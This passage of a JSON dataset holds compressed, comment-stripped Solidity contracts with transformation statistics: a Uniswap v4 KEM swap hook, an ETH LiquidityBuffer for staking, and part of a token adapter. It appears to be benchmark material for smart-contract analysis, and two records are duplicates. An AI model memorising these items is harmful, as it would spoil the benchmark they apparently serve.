{\n_getMaskOrRevert(config.phantomToken);\nphantomTokenToOutputToken[config.phantomToken] = config.token;\noutputTokenToPhantomToken[config.token] = config.phantomToken;\n}\n} else {\n_allowedTokens.remove(config.token);\naddress phantomToken = outputTokenToPhantomToken[config.token];\nif (phantomToken != address(0)) {\ndelete outputTokenToPhantomToken[config.token];\ndelete phantomTokenToOutputToken[phantomToken];\n}\n}\nemit SetTokenAllowedStatus(config.token, config.phantomToken, config.allowed);\n}\n}\nfunction serialize() external view returns (bytes memory serializedData) {\nserializedData = abi.encode(creditManager, targetContract, gateway, mToken, allowedTokens());\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 39,
        "mode": "compressed",
        "original_lines": 214,
        "transformed_lines": 127,
        "original_chars": 8732,
        "transformed_chars": 5051,
        "compression_ratio": 0.58
      },
      "error": null
    },
    {
      "original_id": "sn_gs_021",
      "transformed_id": "ss_l1_compressed_sn_gs_021",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.8.26;\nimport {BaseKEMHook} from './base/BaseKEMHook.sol';\nimport {IKEMHook} from './interfaces/IKEMHook.sol';\nimport {HookDataDecoder} from './libraries/HookDataDecoder.sol';\nimport {IHooks} from 'uniswap/v4-core/src/interfaces/IHooks.sol';\nimport {IPoolManager} from 'uniswap/v4-core/src/interfaces/IPoolManager.sol';\nimport {IUnlockCallback} from 'uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol';\nimport {Hooks} from 'uniswap/v4-core/src/libraries/Hooks.sol';\nimport {BalanceDelta, toBalanceDelta} from 'uniswap/v4-core/src/types/BalanceDelta.sol';\nimport {\nBeforeSwapDelta, BeforeSwapDeltaLibrary\n} from 'uniswap/v4-core/src/types/BeforeSwapDelta.sol';\nimport {Currency} from 'uniswap/v4-core/src/types/Currency.sol';\nimport {PoolId} from 'uniswap/v4-core/src/types/PoolId.sol';\nimport {PoolKey} from 'uniswap/v4-core/src/types/PoolKey.sol';\nimport {SignatureChecker} from\n'openzeppelin-contracts/contracts/utils/cryptography/SignatureChecker.sol';\ncontract UniswapV4KEMHook is BaseKEMHook, IUnlockCallback {\nerror NotPoolManager();\nIPoolManager public immutable poolManager;\nconstructor(\nIPoolManager _poolManager,\naddress initialOwner,\naddress[] memory initialClaimableAccounts,\naddress initialQuoteSigner,\naddress initialEgRecipient\n) BaseKEMHook(initialOwner, initialClaimableAccounts, initialQuoteSigner, initialEgRecipient) {\npoolManager = _poolManager;\nHooks.validateHookPermissions(IHooks(address(this)), getHookPermissions());\n}\nmodifier onlyPoolManager() {\nif (msg.sender != address(poolManager)) revert NotPoolManager();\n_;\n}\nfunction claimEgTokens(address[] calldata tokens, uint256[] calldata amounts) public {\nrequire(claimable[msg.sender], NonClaimableAccount(msg.sender));\nrequire(tokens.length == amounts.length, MismatchedArrayLengths());\npoolManager.unlock(abi.encode(tokens, amounts));\n}\nfunction unlockCallback(bytes calldata data) public onlyPoolManager returns (bytes memory) {\n(address[] memory tokens, uint256[] memory amounts) = abi.decode(data, (address[], uint256[]));\nfor (uint256 i = 0; i < tokens.length; i++) {\nuint256 id = uint256(uint160(tokens[i]));\nif (amounts[i] == 0) {\namounts[i] = poolManager.balanceOf(address(this), id);\n}\nif (amounts[i] > 0) {\npoolManager.burn(address(this), id, amounts[i]);\npoolManager.take(Currency.wrap(tokens[i]), egRecipient, amounts[i]);\n}\n}\nemit ClaimEgTokens(egRecipient, tokens, amounts);\n}\nfunction getHookPermissions() public pure returns (Hooks.Permissions memory) {\nreturn Hooks.Permissions({\nbeforeInitialize: false,\nafterInitialize: false,\nbeforeAddLiquidity: false,\nafterAddLiquidity: false,\nbeforeRemoveLiquidity: false,\nafterRemoveLiquidity: false,\nbeforeSwap: true,\nafterSwap: true,\nbeforeDonate: false,\nafterDonate: false,\nbeforeSwapReturnDelta: false,\nafterSwapReturnDelta: true,\nafterAddLiquidityReturnDelta: false,\nafterRemoveLiquidityReturnDelta: false\n});\n}\nfunction beforeSwap(\naddress sender,\nPoolKey calldata key,\nIPoolManager.SwapParams calldata params,\nbytes calldata hookData\n) external onlyPoolManager returns (bytes4, BeforeSwapDelta, uint24) {\nrequire(params.amountSpecified < 0, ExactOutputDisabled());\n(\nint256 maxAmountIn,\nint256 maxExchangeRate,\nint256 exchangeRateDenom,\nuint256 nonce,\nuint256 expiryTime,\nbytes memory signature\n) = HookDataDecoder.decodeAllHookData(hookData);\nrequire(block.timestamp <= expiryTime, ExpiredSignature(expiryTime, block.timestamp));\nrequire(\n-params.amountSpecified <= maxAmountIn,\nExceededMaxAmountIn(maxAmountIn, -params.amountSpecified)\n);\n_useUnorderedNonce(nonce);\nbytes32 digest = keccak256(\nabi.encode(\nsender,\nkey,\nparams.zeroForOne,\nmaxAmountIn,\nmaxExchangeRate,\nexchangeRateDenom,\nnonce,\nexpiryTime\n)\n);\nrequire(\nSignatureChecker.isValidSignatureNow(quoteSigner, digest, signature), InvalidSignature()\n);\nreturn (this.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);\n}\nfunction afterSwap(\naddress,\nPoolKey calldata key,\nIPoolManager.SwapParams calldata params,\nBalanceDelta delta,\nbytes calldata hookData\n) external onlyPoolManager returns (bytes4, int128) {\n(int256 maxExchangeRate, int256 exchangeRateDenom) =\nHookDataDecoder.decodeExchangeRate(hookData);\nint128 amountIn;\nint128 amountOut;\nCurrency currencyOut;\nunchecked {\nif (params.zeroForOne) {\namountIn = -delta.amount0();\namountOut = delta.amount1();\ncurrencyOut = key.currency1;\n} else {\namountIn = -delta.amount1();\namountOut = delta.amount0();\ncurrencyOut = key.currency0;\n}\n}\nint256 maxAmountOut = amountIn * maxExchangeRate / exchangeRateDenom;\nunchecked {\nint256 egAmount = maxAmountOut < amountOut ? amountOut - maxAmountOut : int256(0);\nif (egAmount > 0) {\npoolManager.mint(\naddress(this), uint256(uint160(Currency.unwrap(currencyOut))), uint256(egAmount)\n);\nemit AbsorbEgToken(PoolId.unwrap(key.toId()), Currency.unwrap(currencyOut), egAmount);\n}\nreturn (this.afterSwap.selector, int128(egAmount));\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 28,
        "mode": "compressed",
        "original_lines": 177,
        "transformed_lines": 145,
        "original_chars": 5775,
        "transformed_chars": 4859,
        "compression_ratio": 0.84
      },
      "error": null
    },
    {
      "original_id": "sn_gs_022",
      "transformed_id": "ss_l1_compressed_sn_gs_022",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.8.26;\nimport {BaseKEMHook} from './base/BaseKEMHook.sol';\nimport {IKEMHook} from './interfaces/IKEMHook.sol';\nimport {HookDataDecoder} from './libraries/HookDataDecoder.sol';\nimport {IHooks} from 'uniswap/v4-core/src/interfaces/IHooks.sol';\nimport {IPoolManager} from 'uniswap/v4-core/src/interfaces/IPoolManager.sol';\nimport {IUnlockCallback} from 'uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol';\nimport {Hooks} from 'uniswap/v4-core/src/libraries/Hooks.sol';\nimport {BalanceDelta, toBalanceDelta} from 'uniswap/v4-core/src/types/BalanceDelta.sol';\nimport {\nBeforeSwapDelta, BeforeSwapDeltaLibrary\n} from 'uniswap/v4-core/src/types/BeforeSwapDelta.sol';\nimport {Currency} from 'uniswap/v4-core/src/types/Currency.sol';\nimport {PoolId} from 'uniswap/v4-core/src/types/PoolId.sol';\nimport {PoolKey} from 'uniswap/v4-core/src/types/PoolKey.sol';\nimport {SignatureChecker} from\n'openzeppelin-contracts/contracts/utils/cryptography/SignatureChecker.sol';\ncontract UniswapV4KEMHook is BaseKEMHook, IUnlockCallback {\nerror NotPoolManager();\nIPoolManager public immutable poolManager;\nconstructor(\nIPoolManager _poolManager,\naddress initialOwner,\naddress[] memory initialClaimableAccounts,\naddress initialQuoteSigner,\naddress initialEgRecipient\n) BaseKEMHook(initialOwner, initialClaimableAccounts, initialQuoteSigner, initialEgRecipient) {\npoolManager = _poolManager;\nHooks.validateHookPermissions(IHooks(address(this)), getHookPermissions());\n}\nmodifier onlyPoolManager() {\nif (msg.sender != address(poolManager)) revert NotPoolManager();\n_;\n}\nfunction claimEgTokens(address[] calldata tokens, uint256[] calldata amounts) public {\nrequire(claimable[msg.sender], NonClaimableAccount(msg.sender));\nrequire(tokens.length == amounts.length, MismatchedArrayLengths());\npoolManager.unlock(abi.encode(tokens, amounts));\n}\nfunction unlockCallback(bytes calldata data) public onlyPoolManager returns (bytes memory) {\n(address[] memory tokens, uint256[] memory amounts) = abi.decode(data, (address[], uint256[]));\nfor (uint256 i = 0; i < tokens.length; i++) {\nuint256 id = uint256(uint160(tokens[i]));\nif (amounts[i] == 0) {\namounts[i] = poolManager.balanceOf(address(this), id);\n}\nif (amounts[i] > 0) {\npoolManager.burn(address(this), id, amounts[i]);\npoolManager.take(Currency.wrap(tokens[i]), egRecipient, amounts[i]);\n}\n}\nemit ClaimEgTokens(egRecipient, tokens, amounts);\n}\nfunction getHookPermissions() public pure returns (Hooks.Permissions memory) {\nreturn Hooks.Permissions({\nbeforeInitialize: false,\nafterInitialize: false,\nbeforeAddLiquidity: false,\nafterAddLiquidity: false,\nbeforeRemoveLiquidity: false,\nafterRemoveLiquidity: false,\nbeforeSwap: true,\nafterSwap: true,\nbeforeDonate: false,\nafterDonate: false,\nbeforeSwapReturnDelta: false,\nafterSwapReturnDelta: true,\nafterAddLiquidityReturnDelta: false,\nafterRemoveLiquidityReturnDelta: false\n});\n}\nfunction beforeSwap(\naddress sender,\nPoolKey calldata key,\nIPoolManager.SwapParams calldata params,\nbytes calldata hookData\n) external onlyPoolManager returns (bytes4, BeforeSwapDelta, uint24) {\nrequire(params.amountSpecified < 0, ExactOutputDisabled());\n(\nint256 maxAmountIn,\nint256 maxExchangeRate,\nint256 exchangeRateDenom,\nuint256 nonce,\nuint256 expiryTime,\nbytes memory signature\n) = HookDataDecoder.decodeAllHookData(hookData);\nrequire(block.timestamp <= expiryTime, ExpiredSignature(expiryTime, block.timestamp));\nrequire(\n-params.amountSpecified <= maxAmountIn,\nExceededMaxAmountIn(maxAmountIn, -params.amountSpecified)\n);\n_useUnorderedNonce(nonce);\nbytes32 digest = keccak256(\nabi.encode(\nsender,\nkey,\nparams.zeroForOne,\nmaxAmountIn,\nmaxExchangeRate,\nexchangeRateDenom,\nnonce,\nexpiryTime\n)\n);\nrequire(\nSignatureChecker.isValidSignatureNow(quoteSigner, digest, signature), InvalidSignature()\n);\nreturn (this.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);\n}\nfunction afterSwap(\naddress,\nPoolKey calldata key,\nIPoolManager.SwapParams calldata params,\nBalanceDelta delta,\nbytes calldata hookData\n) external onlyPoolManager returns (bytes4, int128) {\n(int256 maxExchangeRate, int256 exchangeRateDenom) =\nHookDataDecoder.decodeExchangeRate(hookData);\nint128 amountIn;\nint128 amountOut;\nCurrency currencyOut;\nunchecked {\nif (params.zeroForOne) {\namountIn = -delta.amount0();\namountOut = delta.amount1();\ncurrencyOut = key.currency1;\n} else {\namountIn = -delta.amount1();\namountOut = delta.amount0();\ncurrencyOut = key.currency0;\n}\n}\nint256 maxAmountOut = amountIn * maxExchangeRate / exchangeRateDenom;\nunchecked {\nint256 egAmount = maxAmountOut < amountOut ? amountOut - maxAmountOut : int256(0);\nif (egAmount > 0) {\npoolManager.mint(\naddress(this), uint256(uint160(Currency.unwrap(currencyOut))), uint256(egAmount)\n);\nemit AbsorbEgToken(PoolId.unwrap(key.toId()), Currency.unwrap(currencyOut), egAmount);\n}\nreturn (this.afterSwap.selector, int128(egAmount));\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 28,
        "mode": "compressed",
        "original_lines": 177,
        "transformed_lines": 145,
        "original_chars": 5775,
        "transformed_chars": 4859,
        "compression_ratio": 0.84
      },
      "error": null
    },
    {
      "original_id": "sn_gs_023",
      "transformed_id": "ss_l1_compressed_sn_gs_023",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.20;\nimport {AccessControlEnumerableUpgradeable} from \"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {Address} from \"openzeppelin/utils/Address.sol\";\nimport {Math} from \"openzeppelin/utils/math/Math.sol\";\nimport {ILiquidityBuffer} from \"./interfaces/ILiquidityBuffer.sol\";\nimport {IPositionManager} from \"./interfaces/IPositionManager.sol\";\nimport {IStakingReturnsWrite} from \"../interfaces/IStaking.sol\";\nimport {IPauserRead} from \"../interfaces/IPauser.sol\";\nimport {ProtocolEvents} from \"../interfaces/ProtocolEvents.sol\";\ninterface LiquidityBufferEvents {\nevent ETHWithdrawnFromManager(uint256 indexed managerId, uint256 amount);\nevent ETHReturnedToStaking(uint256 amount);\nevent ETHAllocatedToManager(uint256 indexed managerId, uint256 amount);\nevent ETHReceivedFromStaking(uint256 amount);\nevent FeesCollected(uint256 amount);\nevent InterestClaimed(\nuint256 indexed managerId,\nuint256 interestAmount\n);\nevent InterestToppedUp(\nuint256 amount\n);\n}\ncontract LiquidityBuffer is Initializable, AccessControlEnumerableUpgradeable, ILiquidityBuffer, LiquidityBufferEvents, ProtocolEvents {\nusing Address for address;\nbytes32 public constant LIQUIDITY_MANAGER_ROLE = keccak256(\"LIQUIDITY_MANAGER_ROLE\");\nbytes32 public constant POSITION_MANAGER_ROLE = keccak256(\"POSITION_MANAGER_ROLE\");\nbytes32 public constant INTEREST_TOPUP_ROLE = keccak256(\"INTEREST_TOPUP_ROLE\");\nbytes32 public constant DRAWDOWN_MANAGER_ROLE = keccak256(\"DRAWDOWN_MANAGER_ROLE\");\nuint16 internal constant _BASIS_POINTS_DENOMINATOR = 10_000;\nIStakingReturnsWrite public stakingContract;\nIPauserRead public pauser;\nuint256 public positionManagerCount;\nmapping(uint256 => PositionManagerConfig) public positionManagerConfigs;\nmapping(uint256 => PositionAccountant) public positionAccountants;\nuint256 public totalFundsReceived;\nuint256 public totalFundsReturned;\nuint256 public totalAllocatedBalance;\nuint256 public totalInterestClaimed;\nuint256 public totalInterestToppedUp;\nuint256 public totalAllocationCapacity;\nuint256 public cumulativeDrawdown;\nuint256 public defaultManagerId;\naddress payable public feesReceiver;\nuint16 public feesBasisPoints;\nuint256 public totalFeesCollected;\nuint256 public pendingInterest;\nuint256 public pendingPrincipal;\nbool public shouldExecuteAllocation;\nmapping(address => bool) public isRegisteredManager;\nstruct Init {\naddress admin;\naddress liquidityManager;\naddress positionManager;\naddress interestTopUp;\naddress drawdownManager;\naddress payable feesReceiver;\nIStakingReturnsWrite staking;\nIPauserRead pauser;\n}\nerror LiquidityBuffer__ManagerNotFound();\nerror LiquidityBuffer__ManagerInactive();\nerror LiquidityBuffer__ManagerAlreadyRegistered();\nerror LiquidityBuffer__ExceedsAllocationCap();\nerror LiquidityBuffer__InsufficientBalance();\nerror LiquidityBuffer__InsufficientAllocation();\nerror LiquidityBuffer__DoesNotReceiveETH();\nerror LiquidityBuffer__Paused();\nerror LiquidityBuffer__InvalidConfiguration();\nerror LiquidityBuffer__ZeroAddress();\nerror LiquidityBuffer__NotStakingContract();\nerror LiquidityBuffer__NotPositionManagerContract();\nerror LiquidityBuffer__ExceedsPendingInterest();\nerror LiquidityBuffer__ExceedsPendingPrincipal();\nconstructor() {\n_disableInitializers();\n}\nfunction initialize(Init memory init) external initializer {\n__AccessControlEnumerable_init();\n_grantRole(DEFAULT_ADMIN_ROLE, init.admin);\n_grantRole(LIQUIDITY_MANAGER_ROLE, init.liquidityManager);\n_grantRole(POSITION_MANAGER_ROLE, init.positionManager);\n_grantRole(INTEREST_TOPUP_ROLE, init.interestTopUp);\n_grantRole(DRAWDOWN_MANAGER_ROLE, init.drawdownManager);\nstakingContract = init.staking;\npauser = init.pauser;\nfeesReceiver = init.feesReceiver;\nshouldExecuteAllocation = true;\n_grantRole(LIQUIDITY_MANAGER_ROLE, address(stakingContract));\n}\nfunction getInterestAmount(uint256 managerId) public view returns (uint256) {\nPositionManagerConfig memory config = positionManagerConfigs[managerId];\nIPositionManager manager = IPositionManager(config.managerAddress);\nuint256 currentBalance = manager.getUnderlyingBalance();\nPositionAccountant memory accounting = positionAccountants[managerId];\nif (currentBalance > accounting.allocatedBalance) {\nreturn currentBalance - accounting.allocatedBalance;\n}\nreturn 0;\n}\nfunction getAvailableCapacity() public view returns (uint256) {\nreturn totalAllocationCapacity - totalAllocatedBalance;\n}\nfunction getAvailableBalance() public view returns (uint256) {\nreturn totalFundsReceived - totalFundsReturned;\n}\nfunction getControlledBalance() public view returns (uint256) {\nuint256 totalBalance = address(this).balance;\nfor (uint256 i = 0; i < positionManagerCount; i++) {\nPositionManagerConfig storage config = positionManagerConfigs[i];\nif (config.isActive) {\nIPositionManager manager = IPositionManager(config.managerAddress);\nuint256 managerBalance = manager.getUnderlyingBalance();\ntotalBalance += managerBalance;\n}\n}\nreturn totalBalance;\n}\nfunction addPositionManager(\naddress managerAddress,\nuint256 allocationCap\n) external onlyRole(POSITION_MANAGER_ROLE) returns (uint256 managerId) {\nif (isRegisteredManager[managerAddress]) revert LiquidityBuffer__ManagerAlreadyRegistered();\nmanagerId = positionManagerCount;\npositionManagerCount++;\npositionManagerConfigs[managerId] = PositionManagerConfig({\nmanagerAddress: managerAddress,\nallocationCap: allocationCap,\nisActive: true\n});\npositionAccountants[managerId] = PositionAccountant({\nallocatedBalance: 0,\ninterestClaimedFromManager: 0\n});\nisRegisteredManager[managerAddress] = true;\ntotalAllocationCapacity += allocationCap;\nemit ProtocolConfigChanged(\nthis.addPositionManager.selector,\n\"addPositionManager(address,uint256)\",\nabi.encode(managerAddress, allocationCap)\n);\n}\nfunction updatePositionManager(\nuint256 managerId,\nuint256 newAllocationCap,\nbool isActive\n) external onlyRole(POSITION_MANAGER_ROLE) {\nif (managerId >= positionManagerCount) {\nrevert LiquidityBuffer__ManagerNotFound();\n}\nPositionManagerConfig storage config = positionManagerConfigs[managerId];\nif (newAllocationCap < positionAccountants[managerId].allocatedBalance) {\nrevert LiquidityBuffer__InvalidConfiguration();\n}\ntotalAllocationCapacity = totalAllocationCapacity - config.allocationCap + newAllocationCap;\nconfig.allocationCap = newAllocationCap;\nconfig.isActive = isActive;\nemit ProtocolConfigChanged(\nthis.updatePositionManager.selector,\n\"updatePositionManager(uint256,uint256,bool)\",\nabi.encode(managerId, newAllocationCap, isActive)\n);\n}\nfunction togglePositionManagerStatus(uint256 managerId) external onlyRole(POSITION_MANAGER_ROLE) {\nif (managerId >= positionManagerCount) {\nrevert LiquidityBuffer__ManagerNotFound();\n}\nPositionManagerConfig storage config = positionManagerConfigs[managerId];\nconfig.isActive = !config.isActive;\nemit ProtocolConfigChanged(\nthis.togglePositionManagerStatus.selector,\n\"togglePositionManagerStatus(uint256)\",\nabi.encode(managerId)\n);\n}\nfunction setCumulativeDrawdown(uint256 drawdownAmount) external onlyRole(DRAWDOWN_MANAGER_ROLE) {\ncumulativeDrawdown = drawdownAmount;\nemit ProtocolConfigChanged(\nthis.setCumulativeDrawdown.selector,\n\"setCumulativeDrawdown(uint256)\",\nabi.encode(drawdownAmount)\n);\n}\nfunction setDefaultManagerId(uint256 newDefaultManagerId) external onlyRole(POSITION_MANAGER_ROLE) {\nif (newDefaultManagerId >= positionManagerCount) {\nrevert LiquidityBuffer__ManagerNotFound();\n}\nif (!positionManagerConfigs[newDefaultManagerId].isActive) {\nrevert LiquidityBuffer__ManagerInactive();\n}\ndefaultManagerId = newDefaultManagerId;\nemit ProtocolConfigChanged(\nthis.setDefaultManagerId.selector,\n\"setDefaultManagerId(uint256)\",\nabi.encode(newDefaultManagerId)\n);\n}\nfunction setFeeBasisPoints(uint16 newBasisPoints) external onlyRole(POSITION_MANAGER_ROLE) {\nif (newBasisPoints > _BASIS_POINTS_DENOMINATOR) {\nrevert LiquidityBuffer__InvalidConfiguration();\n}\nfeesBasisPoints = newBasisPoints;\nemit ProtocolConfigChanged(\nthis.setFeeBasisPoints.selector, \"setFeeBasisPoints(uint16)\", abi.encode(newBasisPoints)\n);\n}\nfunction setFeesReceiver(address payable newReceiver)\nexternal\nonlyRole(POSITION_MANAGER_ROLE)\nnotZeroAddress(newReceiver) {\nfeesReceiver = newReceiver;\nemit ProtocolConfigChanged(this.setFeesReceiver.selector, \"setFeesReceiver(address)\", abi.encode(newReceiver));\n}\nfunction setShouldExecuteAllocation(bool executeAllocation) external onlyRole(POSITION_MANAGER_ROLE) {\nshouldExecuteAllocation = executeAllocation;\nemit ProtocolConfigChanged(this.setShouldExecuteAllocation.selector, \"setShouldExecuteAllocation(bool)\", abi.encode(executeAllocation));\n}\nfunction depositETH() external payable onlyRole(LIQUIDITY_MANAGER_ROLE) {\nif (pauser.isLiquidityBufferPaused()) revert LiquidityBuffer__Paused();\n_receiveETHFromStaking(msg.value);\nif (shouldExecuteAllocation) {\n_allocateETHToManager(defaultManagerId, msg.value);\n}\n}\nfunction withdrawAndReturn(uint256 managerId, uint256 amount) external onlyRole(LIQUIDITY_MANAGER_ROLE) {\n_withdrawETHFromManager(managerId, amount);\n_returnETHToStaking(amount);\n}\nfunction allocateETHToManager(uint256 managerId, uint256 amount) external onlyRole(LIQUIDITY_MANAGER_ROLE) {\n_allocateETHToManager(managerId, amount);\n}\nfunction withdrawETHFromManager(uint256 managerId, uint256 amount) external onlyRole(LIQUIDITY_MANAGER_ROLE) {\n_withdrawETHFromManager(managerId, amount);\n}\nfunction returnETHToStaking(uint256 amount) external onlyRole(LIQUIDITY_MANAGER_ROLE) {\n_returnETHToStaking(amount);\n}\nfunction receiveETHFromPositionManager() external payable onlyPositionManagerContract {\n}\nfunction claimInterestFromManager(uint256 managerId, uint256 minAmount) external onlyRole(INTEREST_TOPUP_ROLE) returns (uint256) {\nuint256 amount = _claimInterestFromManager(managerId);\nif (amount < minAmount) {\nrevert LiquidityBuffer__InsufficientBalance();\n}\nreturn amount;\n}\nfunction topUpInterestToStaking(uint256 amount) external onlyRole(INTEREST_TOPUP_ROLE) returns (uint256) {\nif (address(this).balance < amount) {\nrevert LiquidityBuffer__InsufficientBalance();\n}\n_topUpInterestToStakingAndCollectFees(amount);\nreturn amount;\n}\nfunction claimInterestAndTopUp(uint256 managerId, uint256 minAmount) external onlyRole(INTEREST_TOPUP_ROLE) returns (uint256) {\nuint256 amount = _claimInterestFromManager(managerId);\nif (amount < minAmount) {\nrevert LiquidityBuffer__InsufficientBalance();\n}\n_topUpInterestToStakingAndCollectFees(amount);\nreturn amount;\n}\nfunction _topUpInterestToStakingAndCollectFees(uint256 amount) internal {\nif (pauser.isLiquidityBufferPaused()) {\nrevert LiquidityBuffer__Paused();\n}\nif (amount > pendingInterest) {\nrevert LiquidityBuffer__ExceedsPendingInterest();\n}\npendingInterest -= amount;\nuint256 fees = Math.mulDiv(feesBasisPoints, amount, _BASIS_POINTS_DENOMINATOR);\nuint256 topUpAmount = amount - fees;\nstakingContract.topUp{value: topUpAmount}();\ntotalInterestToppedUp += topUpAmount;\nemit InterestToppedUp(topUpAmount);\nif (fees > 0) {\nAddress.sendValue(feesReceiver, fees);\ntotalFeesCollected += fees;\nemit FeesCollected(fees);\n}\n}\nfunction _claimInterestFromManager(uint256 managerId) internal returns (uint256) {\nif (pauser.isLiquidityBufferPaused()) {\nrevert LiquidityBuffer__Paused();\n}\nuint256 interestAmount = getInterestAmount(managerId);\nif (interestAmount > 0) {\nPositionManagerConfig memory config = positionManagerConfigs[managerId];\npositionAccountants[managerId].interestClaimedFromManager += interestAmount;\ntotalInterestClaimed += interestAmount;\npendingInterest += interestAmount;\nemit InterestClaimed(managerId, interestAmount);\nIPositionManager manager = IPositionManager(config.managerAddress);\nmanager.withdraw(interestAmount);\n} else {\nemit InterestClaimed(managerId, interestAmount);\n}\nreturn interestAmount;\n}\nfunction _withdrawETHFromManager(uint256 managerId, uint256 amount) internal {\nif (pauser.isLiquidityBufferPaused()) {\nrevert LiquidityBuffer__Paused();\n}\nif (managerId >= positionManagerCount) revert LiquidityBuffer__ManagerNotFound();\nPositionManagerConfig memory config = positionManagerConfigs[managerId];\nif (!config.isActive) revert LiquidityBuffer__ManagerInactive();\nPositionAccountant storage accounting = positionAccountants[managerId];\nif (amount > accounting.allocatedBalance) {\nrevert LiquidityBuffer__InsufficientAllocation();\n}\naccounting.allocatedBalance -= amount;\ntotalAllocatedBalance -= amount;\npendingPrincipal += amount;\nemit ETHWithdrawnFromManager(managerId, amount);\nIPositionManager manager = IPositionManager(config.managerAddress);\nmanager.withdraw(amount);\n}\nfunction _returnETHToStaking(uint256 amount) internal {\nif (pauser.isLiquidityBufferPaused()) {\nrevert LiquidityBuffer__Paused();\n}\nif (address(stakingContract) == address(0)) {\nrevert LiquidityBuffer__ZeroAddress();\n}\nif (amount > pendingPrincipal) {\nrevert LiquidityBuffer__ExceedsPendingPrincipal();\n}\ntotalFundsReturned += amount;\npendingPrincipal -= amount;\nemit ETHReturnedToStaking(amount);\nstakingContract.receiveReturnsFromLiquidityBuffer{value: amount}();\n}\nfunction _allocateETHToManager(uint256 managerId, uint256 amount) internal {\nif (pauser.isLiquidityBufferPaused()) {\nrevert LiquidityBuffer__Paused();\n}\nif (amount > pendingPrincipal) {\nrevert LiquidityBuffer__ExceedsPendingPrincipal();\n}\nif (managerId >= positionManagerCount) revert LiquidityBuffer__ManagerNotFound();\nif (address(this).balance < amount) revert LiquidityBuffer__InsufficientBalance();\nPositionManagerConfig memory config = positionManagerConfigs[managerId];\nif (!config.isActive) revert LiquidityBuffer__ManagerInactive();\nPositionAccountant storage accounting = positionAccountants[managerId];\nif (accounting.allocatedBalance + amount > config.allocationCap) {\nrevert LiquidityBuffer__ExceedsAllocationCap();\n}\naccounting.allocatedBalance += amount;\ntotalAllocatedBalance += amount;\npendingPrincipal -= amount;\nemit ETHAllocatedToManager(managerId, amount);\nIPositionManager manager = IPositionManager(config.managerAddress);\nmanager.deposit{value: amount}(0);\n}\nfunction _receiveETHFromStaking(uint256 amount) internal {\ntotalFundsReceived += amount;\npendingPrincipal += amount;\nemit ETHReceivedFromStaking(amount);\n}\nmodifier notZeroAddress(address addr) {\nif (addr == address(0)) {\nrevert LiquidityBuffer__ZeroAddress();\n}\n_;\n}\nmodifier onlyStakingContract() {\nif (msg.sender != address(stakingContract)) {\nrevert LiquidityBuffer__NotStakingContract();\n}\n_;\n}\nmodifier onlyPositionManagerContract() {\nbool isValidManager = false;\nfor (uint256 i = 0; i < positionManagerCount; i++) {\nPositionManagerConfig memory config = positionManagerConfigs[i];\nif (msg.sender == config.managerAddress && config.isActive) {\nisValidManager = true;\nbreak;\n}\n}\nif (!isValidManager) {\nrevert LiquidityBuffer__NotPositionManagerContract();\n}\n_;\n}\nreceive() external payable {\nrevert LiquidityBuffer__DoesNotReceiveETH();\n}\nfallback() external payable {\nrevert LiquidityBuffer__DoesNotReceiveETH();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 110,
        "mode": "compressed",
        "original_lines": 571,
        "transformed_lines": 392,
        "original_chars": 22442,
        "transformed_chars": 14931,
        "compression_ratio": 0.67
      },
      "error": null
    },
    {
      "original_id": "sn_gs_024",
      "transformed_id": "ss_l1_compressed_sn_gs_024",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.20;\nimport {AccessControlEnumerableUpgradeable} from \"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {Address} from \"openzeppelin/utils/Address.sol\";\nimport {Math} from \"openzeppelin/utils/math/Math.sol\";\nimport {ILiquidityBuffer} from \"./interfaces/ILiquidityBuffer.sol\";\nimport {IPositionManager} from \"./interfaces/IPositionManager.sol\";\nimport {IStakingReturnsWrite} from \"../interfaces/IStaking.sol\";\nimport {IPauserRead} from \"../interfaces/IPauser.sol\";\nimport {ProtocolEvents} from \"../interfaces/ProtocolEvents.sol\";\ninterface LiquidityBufferEvents {\nevent ETHWithdrawnFromManager(uint256 indexed managerId, uint256 amount);\nevent ETHReturnedToStaking(uint256 amount);\nevent ETHAllocatedToManager(uint256 indexed managerId, uint256 amount);\nevent ETHReceivedFromStaking(uint256 amount);\nevent FeesCollected(uint256 amount);\nevent InterestClaimed(\nuint256 indexed managerId,\nuint256 interestAmount\n);\nevent InterestToppedUp(\nuint256 amount\n);\n}\ncontract LiquidityBuffer is Initializable, AccessControlEnumerableUpgradeable, ILiquidityBuffer, LiquidityBufferEvents, ProtocolEvents {\nusing Address for address;\nbytes32 public constant LIQUIDITY_MANAGER_ROLE = keccak256(\"LIQUIDITY_MANAGER_ROLE\");\nbytes32 public constant POSITION_MANAGER_ROLE = keccak256(\"POSITION_MANAGER_ROLE\");\nbytes32 public constant INTEREST_TOPUP_ROLE = keccak256(\"INTEREST_TOPUP_ROLE\");\nbytes32 public constant DRAWDOWN_MANAGER_ROLE = keccak256(\"DRAWDOWN_MANAGER_ROLE\");\nuint16 internal constant _BASIS_POINTS_DENOMINATOR = 10_000;\nIStakingReturnsWrite public stakingContract;\nIPauserRead public pauser;\nuint256 public positionManagerCount;\nmapping(uint256 => PositionManagerConfig) public 